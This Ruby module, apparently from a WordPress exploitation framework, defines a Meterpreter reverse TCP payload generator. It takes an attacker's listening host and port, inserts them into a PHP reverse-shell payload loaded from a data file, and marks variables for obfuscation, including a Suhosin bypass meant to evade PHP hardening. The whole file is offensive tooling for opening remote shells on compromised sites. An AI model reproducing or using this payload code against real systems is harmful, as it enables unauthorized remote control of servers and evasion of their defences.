# frozen_string_literal: true

module Wpxf::Payloads
  # A Meterpreter reverse TCP payload generator.
  class MeterpreterReverseTcp < Wpxf::Payload
    include Wpxf
    include Wpxf::Options

    def initialize
      super

      register_options([
        StringOption.new(
          name: 'lhost',
          required: true,
          desc: 'The address of the host listening for a connection'
        ),
        PortOption.new(
          name: 'lport',
          required: true,
          default: 4444,
          desc: 'The port being used to listen for incoming connections'
        )
      ])
    end

    def host
      escape_single_quotes(datastore['lhost'])
    end

    def lport
      normalized_option_value('lport')
    end

    def raw
      DataFile.new('php', 'meterpreter_reverse_tcp.php').php_content
    end

    def constants
      {
        'ip'   => host,
        'port' => lport
      }
    end

    def obfuscated_variables
      super + %w[ip port f s_type s res len a b suhosin_bypass]
    end
  end
end
